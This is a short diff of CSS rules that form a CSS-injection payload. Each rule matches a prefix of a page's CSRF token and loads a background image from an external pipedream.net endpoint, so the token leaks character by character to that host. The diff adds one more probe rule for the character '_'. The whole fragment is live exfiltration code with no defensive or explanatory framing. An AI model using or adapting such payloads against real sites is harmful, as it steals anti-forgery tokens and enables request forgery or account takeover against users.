@@ -59,5 +59,6 @@ input[name="csrf"][value^="ruWA"]{background-image: url(https://eomtg1jcz48suc3.
         input[name="csrf"][value^="ruW6"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW6);} 
         input[name="csrf"][value^="ruW7"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW7);} 
         input[name="csrf"][value^="ruW8"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW8);} 
-        input[name="csrf"][value^="ruW9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW9);} 
+        input[name="csrf"][value^="ruW9"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW9);}
+        input[name="csrf"][value^="ruW_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW_);} 
             
